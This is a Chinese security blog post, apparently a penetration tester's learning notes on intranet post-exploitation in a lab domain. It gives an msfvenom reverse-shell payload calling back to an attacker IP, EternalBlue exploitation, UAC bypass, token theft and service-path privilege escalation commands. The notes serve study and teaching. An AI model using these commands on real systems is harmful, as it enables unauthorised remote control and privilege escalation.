@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Acbug.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"dmkxy.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x00 本文顺序内网架构及反弹shell-&gt;信息搜集1-&gt;本地提权-&gt;隧道搭建-&gt;信息搜集2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网学习笔记①">
+<meta property="og:url" content="https://dmkxy.github.io/2021/10/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/index.html">
+<meta property="og:site_name" content="DMKXY&#39;s Blog">
+<meta property="og:description" content="0x00 本文顺序内网架构及反弹shell-&gt;信息搜集1-&gt;本地提权-&gt;隧道搭建-&gt;信息搜集2">
+<meta property="og:locale">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/1.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/2.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/3.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/4.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/5.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/6.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/7.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/8.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/9.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/10.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/11.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/12.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/13.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/14.png">
+<meta property="article:published_time" content="2021-10-29T16:30:26.000Z">
+<meta property="article:modified_time" content="2021-11-01T12:48:07.646Z">
+<meta property="article:author" content="DMKXY">
+<meta property="article:tag" content="2021.11">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dmkxy.github.io/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/1.png">
+
+<link rel="canonical" href="https://dmkxy.github.io/2021/10/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>内网学习笔记① | DMKXY's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">DMKXY's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">从程序员到白帽，从0到1</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/DMKXY" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/10/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="DMKXY">
+      <meta itemprop="description" content="这是一个用来学安全的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DMKXY's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网学习笔记①
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-30 00:30:26" itemprop="dateCreated datePublished" datetime="2021-10-30T00:30:26+08:00">2021-10-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-01 20:48:07" itemprop="dateModified" datetime="2021-11-01T20:48:07+08:00">2021-11-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">内网学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x00-本文顺序"><a href="#0x00-本文顺序" class="headerlink" title="0x00 本文顺序"></a>0x00 本文顺序</h3><p>内网架构及反弹shell-&gt;信息搜集1-&gt;本地提权-&gt;隧道搭建-&gt;信息搜集2</p>
+<p>提权与信息搜集是息息相关、相互嵌套的，你拿到怎样的权限才能获取相对应的信息，<strong>内网渗透就是不断获取信息的过程</strong>。在刚拿到内网机器时你的权限只允许你做简单的信息搜集，而之后需要根据之前搜集的内容进行提权，而要获取内网中其他主机的信息以及后续对于其他主机的渗透又需要隧道进行通信，所以在提权后进行隧道搭建，最后实施进一步的信息搜集。</p>
+<h3 id="0x01-内网架构及反弹shell"><a href="#0x01-内网架构及反弹shell" class="headerlink" title="0x01 内网架构及反弹shell"></a>0x01 内网架构及反弹shell</h3><h4 id="Ⅰ-内网环境"><a href="#Ⅰ-内网环境" class="headerlink" title="Ⅰ 内网环境"></a>Ⅰ 内网环境</h4><p>用一张图来表示（其中域名为lce.com）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/1.png" alt="图片"><br>可以看到攻击机kali与内网win7可以通信，win7、server2012（域控）和xp在同一个域内（lce.com），其中win7与server2012在同一个局域网，而server2012与xp又在另一个局域网内。</p>
+<p>目前情况是我们已经拿到了win7的webshell，接下来我们需要通过kali拿到反弹shell，之后我们再横向拿下域控，再进一步拿下xp这台主机。</p>
+<h4 id="Ⅱ-msf反弹shell"><a href="#Ⅱ-msf反弹shell" class="headerlink" title="Ⅱ msf反弹shell"></a>Ⅱ msf反弹shell</h4><p><strong>为什么要反弹shell</strong><br>一般来说目标主机与我们攻击者之间都存在防火墙等安全设备，限制了流入目标主机的流量，导致我们直接连接目标主机会失败。所以我们想让目标主机主动连接我们，这就是反弹shell。<br><strong>如何反弹shell</strong><br>反弹shell的方法有很多，这里推荐使用msfconsole+msfvenom，如果需要免杀还可以生成指令配合混淆免杀，比如Backdoor-factory等等。</p>
+<p>我们通过反弹shell，将10.188.16.131的win7的shell反弹给我们的攻击机10.188.10.200的kali。</p>
+<pre class="line-numbers language-none"><code class="language-none">1.生成目标文件
+    msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 5 LHOST&#x3D;10.188.10.200 LPORT&#x3D;6666 -f exe &gt; attack.exe
+2.通过webshell上传attack.exe到目标主机并运行。
+3.打开msf使用
+    use exploit&#x2F;multi&#x2F;handler
+    set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
+    show options 之后设置lpost和lhost即可
+    exploit
+4.得到反弹的meterpreter
+
+PS：msfvenom参数说明：
+        -p –payload &lt; payload&gt; 指定需要使用的payload
+        -l payloads 查看所有的攻击载荷
+        -e –encoder [encoder] 指定需要使用的encoder
+        -i 5 –iterations &lt;count&gt; 指定payload的编码次数为5次
+        -f 生成文件格式
+        lhost和lport分别为反弹到主机的ip和端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="0x02-信息搜集1"><a href="#0x02-信息搜集1" class="headerlink" title="0x02 信息搜集1"></a>0x02 信息搜集1</h3><p>本机信息搜集（主要任务是探测本机简单信息，为提权和进一步信息搜集做准备，其中有价值的信息主要是网段信息、用户账户和系统信息）<br>常用指令（按照是否常用顺序排列）：</p>
+<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;all     &#x2F;&#x2F;查询当前用户
+ipconfig &#x2F;all   &#x2F;&#x2F;列出网络信息
+net user        &#x2F;&#x2F;查询当前电脑的用户账户
+systeminfo      &#x2F;&#x2F;查询主机信息
+tasklist        &#x2F;&#x2F;查询进程列表
+query user      &#x2F;&#x2F;查询当前用户以及登陆时间等信息
+route print     &#x2F;&#x2F;打印路由
+arp -a          &#x2F;&#x2F;打印arp缓存信息
+netstat -ano | findstr &quot;3306&quot;   &#x2F;&#x2F;查询相关端口信息
+net share       &#x2F;&#x2F;查看共享资源
+net session     &#x2F;&#x2F;列出或断开本地计算机和与之连接的客户端的会话
+cmdkey list     &#x2F;&#x2F;列出本机凭据
+wmic product    &#x2F;&#x2F;查询安装软件信息
+wmic service    &#x2F;&#x2F;查询本机服务信息
+netsh firewall show config      &#x2F;&#x2F;查看防火墙设置
+net statistics workstation      &#x2F;&#x2F;本地工作站或服务器服务的统计记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其中ipconfig和net user以及systeminfo非常重要。</p>
+<p>通过ipconfig可以查看到当前主机位于哪个网段，如果还存在其他网段，那么极有可能存在另一个局域网区域。比如上述环境中的win7，既与kali在同一个外网，也存在于另一个网段192.168.174.1中。所以进一步的信息搜集可以对这个网段扫描。<br>通过net user可以查看有哪些用户存在，为下一步的域渗透和提权做准备。<br>通过systeminfo可以查看本机信息，获取哪些补丁没有打，为接下来提权做准备。</p>
+<h3 id="0x03-本地提权"><a href="#0x03-本地提权" class="headerlink" title="0x03 本地提权"></a>0x03 本地提权</h3><h4 id="Ⅰ-溢出漏洞提权"><a href="#Ⅰ-溢出漏洞提权" class="headerlink" title="Ⅰ 溢出漏洞提权"></a>Ⅰ 溢出漏洞提权</h4><p><strong>溢出漏洞</strong><br>缓冲区溢出漏洞，是由于恶意代码在执行时，向缓冲区写入超过其长度的内容，造成进程的堆栈被更改，进而执行恶意代码，达到了攻击的目的。</p>
+<p>我们主要需要利用工具找出系统相关系统漏洞并加以利用，配合msf或者Cobaltstrike等相关工具实现提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">msf &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patches
+
+通过已经获取的meterpreter的session查询目标主机存在的可以利用的漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">windows-exploit-suggester.py -d vulinfo.xls -i systeminfo.txt
+
+其中systeminfo.txt内容是通过systeminfo命令获取的系统信息，里面记录了所有打过的补丁，
+windows-exploit-suggester.py这个py文件根据补丁记录与漏洞信息（vulinfo.xls)进行比较，
+获得可以利用的相关漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">import-module Sherlock.ps1
+find-allvulns
+
+首先导入Sherlock.ps1这个powershell模块，之后调用find-allvulns查询可以利用的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.\Vulmap.ps1
+
+直接执行脚本Vulmap.ps1，可以自动查询出本机可以利用的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.\KBCollect.ps1             &#x2F;&#x2F;收集信息
+.\cve-check.py -u             &#x2F;&#x2F;创建CVEKB数据库
+.\cve-check.py -U             &#x2F;&#x2F;更新CVEKB数据库中的hasPOC字段
+.\cve-check.py -C -f KB.json  &#x2F;&#x2F;查看具有公开EXP的CVE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.\ms17-010-m4ss-sc4nn3r-master.exe 10.188.16.131
+
+查询IP主机是否存在ms17-010漏洞利用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>当然还有其它方法，这里就不一一列举了。在拿到可以利用的漏洞以后，可以使用msf自带的exploit模块进行攻击，或者在windows-kernel-exploits公开的收集库中查找可以用来提权的exp。</p>
+<p>我这里通过msf使用永恒之蓝（ms17-010）拿到win7的system权限。</p>
+<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
+msf5 &gt; show options
+msf5 &gt; set rhost 10.188.16.131
+msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/2.png" alt="图片"></p>
+<h4 id="Ⅱ-ByPassUAC"><a href="#Ⅱ-ByPassUAC" class="headerlink" title="Ⅱ ByPassUAC"></a>Ⅱ ByPassUAC</h4><p><strong>关于UAC</strong><br>User Account Control，用户帐户控制是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/3.png" alt="图片"><br>这里我主要介绍使用msf以及另外两个框架内来bypass，以及简单利用CobaltStrike4.0来提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">在得到反弹的meterpreter后，我们执行background，将session放到后台，之后，选取bypass模块。
+msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac &#x2F;&#x2F;或者use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection
+                                           &#x2F;&#x2F;或者use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbs
+msf5 &gt; show options
+msf5 &gt; set session 3    &#x2F;&#x2F;这里的session就是我们反弹shell得到的meterpreter
+msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">这里介绍使用nishang开源框架，主要用于后渗透攻击，存在许多模块，比如提权，端口扫描，后门等等。
+首先下载nishang后上传到目标机器（win7），之后使用msf获取的用户权限的shell导入nishang框架，并使用。
+import-module .\nishang.psm1    &#x2F;&#x2F;导入
+Get-Command -Module nishang     &#x2F;&#x2F;获取可以使用的module
+Invoke-PsUACme                &#x2F;&#x2F;使用bypassuac这个模块进行提权<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">最后介绍Empire框架，它类似于msf，也是一款集成的工具。
+首先我们需要下载并安装Empire到kali，之后操作类似msf反弹shell，可以获取目标机器的会话（这里略过）。之后bypass提权我们使用usemodule privesc&#x2F;bypassuac这个模块。
+&gt; usemodule privesc&#x2F;bypassuac
+&gt; info
+&gt; set listener w7   &#x2F;&#x2F;这里的w7是之前反弹会话时设置的监听
+&gt; execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">CobaltStrike4.0（大名鼎鼎QAQ）
+以kali为例讲解
+下载好以后进入其目录，打开两个终端以便于后续操作，以下指令最好用root权限执行。
+.&#x2F;teamserver 10.188.10.200 pass &#x2F;&#x2F;终端1执行，IP是本机地址，pass是自己设置的密码（一会要用）
+.&#x2F;start.sh                      &#x2F;&#x2F;终端2执行，打开CobaltStrike界面，输入用户名（随意）和密码（刚才设置的）
+Cobalt Strike-&gt;Listenners   &#x2F;&#x2F;界面操作，创建listener
+Attacks-&gt;Packages-&gt;Windows Executable  &#x2F;&#x2F;生成反弹shell的文件，生成后上传到目标主机win7，并运行
+类似于meterpreter，我们会获得一个beacon用来执行命令。
+之后进行提权，我们这里选择uac提权，也可以选择其他方式。以图来说明。
+
+CobaltStrike还有其他许多用处比如：桌面交互、进程列表、端口扫描、代理、钓鱼等功能，
+域内功能包括mimikatz、hashdump、金票据等等，我们之后也会陆续介绍。可以说CobaltStrike是一款强大的图形化的内网工具。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/4.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/5.png" alt="图片"></p>
+<h4 id="Ⅲ-令牌窃取"><a href="#Ⅲ-令牌窃取" class="headerlink" title="Ⅲ 令牌窃取"></a>Ⅲ 令牌窃取</h4><p><strong>关于Token</strong><br>Windows有两种类型的Token：<br>1.Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>2.Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文档夹)</p>
+<p>另外，两种token只在系统重启后清除。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
+<p>这里介绍两种方式使用令牌窃取进行提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">incognito：exe&#x2F;msf均可，msf中的incognito是从windows中的exe文件中移植过去的，这里以msf自带的incognito为例。
+首先我们进入之前获取的meterpreter
+msf5 &gt; session 3
+meterpreter &gt; load incognito                            &#x2F;&#x2F;加载incognito（除了incognito外还可以加载其他插件比如mimikatz，我们之后会用到）
+meterpreter &gt; getuid                                    &#x2F;&#x2F;查看当前token 
+meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;列出可用token
+meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   &#x2F;&#x2F;token窃取，格式为impersonate_token&quot;主机名\\用户名&quot;
+meterpreter &gt; getuid                                    &#x2F;&#x2F;查看当前token 
+meterpreter &gt; rev2self                                  &#x2F;&#x2F;返回之前的token
+
+windows平台下的incognito.exe操作与此类似。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">rotten potato+meterpreter，适用于当没有Impersonmate Token时的情况。
+首先上传rottenpotato.exe到目标主机
+meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;此时只有当前用户令牌
+meterpreter &gt; execute -cH -f rottenpotato.exe           &#x2F;&#x2F;执行rottenpotato模仿system令牌
+meterpreter &gt; list_tokens -u                            &#x2F;&#x2F;此时会有system权限的模仿令牌
+meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   &#x2F;&#x2F;token窃取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="Ⅳ-系统配置错误提权"><a href="#Ⅳ-系统配置错误提权" class="headerlink" title="Ⅳ 系统配置错误提权"></a>Ⅳ 系统配置错误提权</h4><p><strong>可信任服务路径</strong></p>
+<p><strong>包含空格且没有引号的路径漏洞</strong><br>计算机系统管理员在配置相关服务时，会指定可执行文件的路径，但是如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。<br>比如：C:\Program Files\Vul file\example.exe<br>尝试依次执行：C:\Program.exe、C:\Program Files\Vul.exe、C:\Program Files\Vul file\example.exe</p>
+<p>如果可以找到这样的路径，我们只需要写的权限，可以放置一个恶意文件，让操作系统把恶意文件执行。<br><strong>查找可信任服务路径</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">使用wmic查询：
+wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;trust_service_path
+msf5 &gt; show options &#x2F;&#x2F;可以看到只需要之前获取的meterpreter的session
+msf5 &gt; set session 3
+msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>系统服务权限配置错误</strong><br>低权限用户对系统调用的可执行文件有写权限，可以将该文件替换成任意可执行文件。<br><strong>查找权限配置错误</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">import-module powerup.ps1
+invoke-allchecks    &#x2F;&#x2F;可以查找目标机器多种配置错误，包括环境变量等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">使用msf
+msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions
+之后只需设置session即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/6.png" alt="图片"><br><strong>AlwaysInstallElevated</strong><br>是一种允许非管理用户以system权限运行安装程序包（.msi文件）的设置。默认情况下禁用此设置，需系统管理员手动启用。<br><strong>查找并利用</strong></p>
